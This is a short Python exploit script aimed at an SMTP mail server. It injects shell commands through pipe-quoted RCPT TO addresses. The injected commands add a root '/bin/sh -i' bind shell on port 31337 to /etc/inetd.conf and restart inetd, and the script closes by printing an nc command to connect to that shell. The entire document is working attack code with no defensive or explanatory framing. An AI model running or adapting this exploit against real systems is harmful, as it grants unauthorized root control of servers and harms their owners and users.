import socket

HOST = ""
PORT = 25

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"ehlo you\r\n")
    s.sendall(b"mail from: <>\r\n")
    s.sendall(b"rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n")
    s.sendall(b"rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n")
    s.sendall(b"data\r\n.\r\nquit\r\n")

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break
            print(data.decode())
        except:
            break

print(f'Complete - connect using: nc -nv {HOST} 31337')
